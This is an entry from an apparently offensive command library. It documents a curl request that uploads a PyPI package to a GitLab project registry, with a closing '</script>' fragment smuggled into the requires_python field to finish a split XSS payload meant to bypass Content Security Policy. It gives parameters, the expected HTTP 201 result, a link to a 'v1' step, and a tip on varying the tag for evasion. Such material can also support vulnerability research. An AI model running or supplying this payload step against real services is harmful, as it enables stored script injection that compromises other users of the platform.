---
id: cmd-curl-pypi-csp-v2
data: >-
  curl -v
  "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi"
  -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=2 -F
  name='package_csp_bypass' -F requires_python=' </script>'
tags:
  - csp-bypass
  - upload
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:20.479Z'
verified: false
validated: true
submitted: true
---
# curl-upload-pypi-csp-v2

## Command

```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=2 -F name='package_csp_bypass' -F requires_python=' </script>'
```

## Description

Uploads version 2 of a PyPi package with the closing part of the split XSS payload to complete CSP bypass concatenation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose | No |
| URL | API endpoint | Yes |
| `-F content=...` | File | Yes |
| `-F requires_python=2.7` | Base | Yes |
| `-F version=2` | Version 2 | Yes |
| `-F name=...` | Name | Yes |
| `-F requires_python=' </script>'` | Closing payload | Yes |

## Examples

### Basic Usage

As shown; requires v1 first.

### Advanced Usage

Customize closing tag for different evasions.

## Expected Output

HTTP 201.

## Related

- [[commands/curl-upload-pypi-csp-v1]]
- [[procedures/Upload-Split-Payload-for-CSP-Bypass]]
